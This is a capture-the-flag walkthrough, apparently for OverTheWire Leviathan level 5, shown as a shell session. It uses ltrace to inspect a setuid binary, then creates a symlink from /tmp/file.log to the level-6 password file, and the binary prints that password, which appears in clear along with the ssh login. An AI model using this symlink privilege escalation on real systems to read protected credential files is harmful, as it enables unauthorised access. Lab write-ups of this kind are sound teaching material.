# Level 5

```shell
leviathan5@gibson:~$ ls -lah
total 36K
drwxr-xr-x  2 root       root       4.0K Sep 19 07:07 .
drwxr-xr-x 83 root       root       4.0K Sep 19 07:09 ..
-rw-r--r--  1 root       root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root       root       3.7K Mar 31  2024 .bashrc
-r-sr-x---  1 leviathan6 leviathan5  15K Sep 19 07:07 leviathan5
-rw-r--r--  1 root       root        807 Mar 31  2024 .profile

leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                              = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                        = 26
exit(-1 <no return ...>
+++ exited (status 255) +++

leviathan5@gibson:~$ touch /tmp/file.log

leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                              = 0x804d1a0
fgetc(0x804d1a0)                                         = '\377'
feof(0x804d1a0)                                          = 1
fclose(0x804d1a0)                                        = 0
getuid()                                                 = 12005
setuid(12005)                                            = 0
unlink("/tmp/file.log")                                  = 0
+++ exited (status 0) +++

leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

leviathan5@gibson:~$ ./leviathan5 
szo7HDB88w

leviathan5@gibson:~$ exit

$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223
$ szo7HDB88w
```
